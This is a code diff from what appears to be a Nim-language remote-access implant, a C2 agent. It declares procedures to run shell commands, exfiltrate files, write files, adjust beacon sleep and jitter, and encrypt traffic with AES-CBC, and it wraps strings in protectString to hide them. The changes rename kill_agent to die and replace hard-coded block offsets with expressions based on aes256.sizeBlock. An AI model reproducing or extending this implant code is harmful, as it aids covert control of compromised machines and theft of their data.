@@ -16,7 +16,7 @@ proc run_shell_command*(client: HttpClient, shell_command: string): bool
 proc exfil_file*(client: HttpClient, file_path: string): bool
 proc write_file*(client: HttpClient, file_data_base64: string, file_path: string): bool
 proc change_sleep_time*(client: HttpClient, timeframe: int,  jitter_percent: int): bool
-proc kill_agent*(client: HttpClient): void
+proc die*(client: HttpClient): void
 
 # Encryption & Encoding
 proc encrypt_cbc*(plain_text: string, key: string, iv: string): string
@@ -120,9 +120,9 @@ proc change_sleep_time*(client: HttpClient, timeframe: int,  jitter_percent: int
     return is_success
 
 
-proc kill_agent*(client: HttpClient): void =
+proc die*(client: HttpClient): void =
     
-    discard post_data(client, protectString("kill") , protectString("""{"Good bye": ":("}"""))
+    discard post_data(client, protectString("die") , protectString("""{"Good bye": ":("}"""))
     quit()
 
 
@@ -133,7 +133,7 @@ proc encrypt_cbc*(plain_text: string, key: string, iv: string): string =
     var plain_text_block: string
     var plain_text_padded = plain_text
     var a = 0
-    var b = 31
+    var b = aes256.sizeBlock * 2 - 1
     
     # padding
     while len(plain_text_padded) mod 32 != 0:
@@ -147,8 +147,8 @@ proc encrypt_cbc*(plain_text: string, key: string, iv: string): string =
         plain_text_block = plain_text_padded.substr(a, b)
         ectx.encrypt(plain_text_block, cipher_text_block)
         cipher_text.add(cipher_text_block)
-        a += 32
-        b += 32
+        a += aes256.sizeBlock * 2
+        b += aes256.sizeBlock * 2
 
     # clear encryption context
     ectx.clear()
@@ -162,7 +162,7 @@ proc decrypt_cbc*(cipher_text: string, key: string, iv: string): string =
     var plain_text: string
     var cipher_text_block: string
     var a = 0
-    var b = 31
+    var b = aes256.sizeBlock * 2 - 1
     
     # init encryption context
     dctx.init(key, iv)
@@ -172,8 +172,8 @@ proc decrypt_cbc*(cipher_text: string, key: string, iv: string): string =
         cipher_text_block = cipher_text.substr(a, b)
         dctx.decrypt(cipher_text_block, plain_text_block)
         plain_text.add(plain_text_block)
-        a += 32
-        b += 32
+        a += aes256.sizeBlock * 2
+        b += aes256.sizeBlock * 2
     
     # clear encryption context
     dctx.clear()
